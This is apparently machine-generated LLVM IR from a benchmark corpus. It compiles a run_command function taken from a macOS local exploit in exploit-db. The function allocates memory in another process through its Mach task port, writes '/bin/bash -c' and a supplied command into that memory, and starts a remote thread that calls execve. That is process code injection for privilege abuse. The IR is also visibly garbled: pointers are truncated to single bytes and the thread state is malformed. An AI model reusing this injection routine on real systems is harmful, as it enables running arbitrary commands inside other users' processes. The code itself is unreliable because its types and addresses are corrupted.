; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/local/extr_40956.c_run_command.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/local/extr_40956.c_run_command.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i8, i8, i8, i8 }

@VM_FLAGS_ANYWHERE = common dso_local global i32 0, align 4
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [22 x i8] c"mach_vm_allocate: %s\0A\00", align 1
@.str.1 = private unnamed_addr constant [26 x i8] c"allocated command at %zx\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"mach_vm_write: %s\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@x86_THREAD_STATE64_COUNT = common dso_local global i32 0, align 4
@execve = common dso_local global i64 0, align 8
@x86_THREAD_STATE64 = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [27 x i8] c"thread_create_running: %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"done?\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @run_command(i32 %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i64, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  %11 = alloca [4 x i8], align 1
  %12 = alloca i32, align 4
  %13 = alloca %struct.TYPE_3__, align 1
  %14 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  store i8 0, i8* %6, align 1
  %15 = load i32, i32* %3, align 4
  %16 = load i32, i32* @VM_FLAGS_ANYWHERE, align 4
  %17 = call i64 @mach_vm_allocate(i32 %15, i8* %6, i32 4096, i32 %16)
  store i64 %17, i64* %5, align 8
  %18 = load i64, i64* %5, align 8
  %19 = load i64, i64* @KERN_SUCCESS, align 8
  %20 = icmp ne i64 %18, %19
  br i1 %20, label %21, label %25

21:                                               ; preds = %2
  %22 = load i64, i64* %5, align 8
  %23 = call i8* @mach_error_string(i64 %22)
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i8* %23)
  br label %103

25:                                               ; preds = %2
  %26 = load i8, i8* %6, align 1
  %27 = sext i8 %26 to i32
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0), i32 %27)
  %29 = load i8, i8* %6, align 1
  store i8 %29, i8* %7, align 1
  %30 = load i8, i8* %6, align 1
  %31 = sext i8 %30 to i32
  %32 = add nsw i32 %31, 16
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* %8, align 1
  %34 = load i8, i8* %6, align 1
  %35 = sext i8 %34 to i32
  %36 = add nsw i32 %35, 32
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %9, align 1
  %38 = load i8, i8* %6, align 1
  %39 = sext i8 %38 to i32
  %40 = add nsw i32 %39, 2048
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %10, align 1
  %42 = getelementptr inbounds [4 x i8], [4 x i8]* %11, i64 0, i64 0
  %43 = load i8, i8* %7, align 1
  store i8 %43, i8* %42, align 1
  %44 = getelementptr inbounds i8, i8* %42, i64 1
  %45 = load i8, i8* %8, align 1
  store i8 %45, i8* %44, align 1
  %46 = getelementptr inbounds i8, i8* %44, i64 1
  %47 = load i8, i8* %9, align 1
  store i8 %47, i8* %46, align 1
  %48 = getelementptr inbounds i8, i8* %46, i64 1
  store i8 0, i8* %48, align 1
  %49 = load i32, i32* %3, align 4
  %50 = load i8, i8* %7, align 1
  %51 = call i32 @strlen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %52 = add nsw i32 %51, 1
  %53 = call i64 @mach_vm_write(i32 %49, i8 signext %50, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i32 %52)
  store i64 %53, i64* %5, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i8, i8* %8, align 1
  %56 = call i32 @strlen(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  %57 = add nsw i32 %56, 1
  %58 = call i64 @mach_vm_write(i32 %54, i8 signext %55, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32 %57)
  store i64 %58, i64* %5, align 8
  %59 = load i32, i32* %3, align 4
  %60 = load i8, i8* %9, align 1
  %61 = load i8*, i8** %4, align 8
  %62 = load i8*, i8** %4, align 8
  %63 = call i32 @strlen(i8* %62)
  %64 = add nsw i32 %63, 1
  %65 = call i64 @mach_vm_write(i32 %59, i8 signext %60, i8* %61, i32 %64)
  store i64 %65, i64* %5, align 8
  %66 = load i32, i32* %3, align 4
  %67 = load i8, i8* %10, align 1
  %68 = getelementptr inbounds [4 x i8], [4 x i8]* %11, i64 0, i64 0
  %69 = call i64 @mach_vm_write(i32 %66, i8 signext %67, i8* %68, i32 4)
  store i64 %69, i64* %5, align 8
  %70 = load i64, i64* %5, align 8
  %71 = load i64, i64* @KERN_SUCCESS, align 8
  %72 = icmp ne i64 %70, %71
  br i1 %72, label %73, label %77

73:                                               ; preds = %25
  %74 = load i64, i64* %5, align 8
  %75 = call i8* @mach_error_string(i64 %74)
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0), i8* %75)
  br label %103

77:                                               ; preds = %25
  %78 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %78, i32* %12, align 4
  %79 = load i32, i32* @x86_THREAD_STATE64_COUNT, align 4
  store i32 %79, i32* %14, align 4
  %80 = call i32 @memset(%struct.TYPE_3__* %13, i32 0, i32 4)
  %81 = load i64, i64* @execve, align 8
  %82 = trunc i64 %81 to i8
  %83 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %13, i32 0, i32 0
  store i8 %82, i8* %83, align 1
  %84 = load i8, i8* %7, align 1
  %85 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %13, i32 0, i32 1
  store i8 %84, i8* %85, align 1
  %86 = load i8, i8* %10, align 1
  %87 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %13, i32 0, i32 2
  store i8 %86, i8* %87, align 1
  %88 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %13, i32 0, i32 3
  store i8 0, i8* %88, align 1
  %89 = load i32, i32* %3, align 4
  %90 = load i32, i32* @x86_THREAD_STATE64, align 4
  %91 = ptrtoint %struct.TYPE_3__* %13 to i32
  %92 = load i32, i32* %14, align 4
  %93 = call i64 @thread_create_running(i32 %89, i32 %90, i32 %91, i32 %92, i32* %12)
  store i64 %93, i64* %5, align 8
  %94 = load i64, i64* %5, align 8
  %95 = load i64, i64* @KERN_SUCCESS, align 8
  %96 = icmp ne i64 %94, %95
  br i1 %96, label %97, label %101

97:                                               ; preds = %77
  %98 = load i64, i64* %5, align 8
  %99 = call i8* @mach_error_string(i64 %98)
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0), i8* %99)
  br label %103

101:                                              ; preds = %77
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  br label %103

103:                                              ; preds = %101, %97, %73, %21
  ret void
}

declare dso_local i64 @mach_vm_allocate(i32, i8*, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @mach_error_string(i64) #1

declare dso_local i64 @mach_vm_write(i32, i8 signext, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(%struct.TYPE_3__*, i32, i32) #1

declare dso_local i64 @thread_create_running(i32, i32, i32, i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
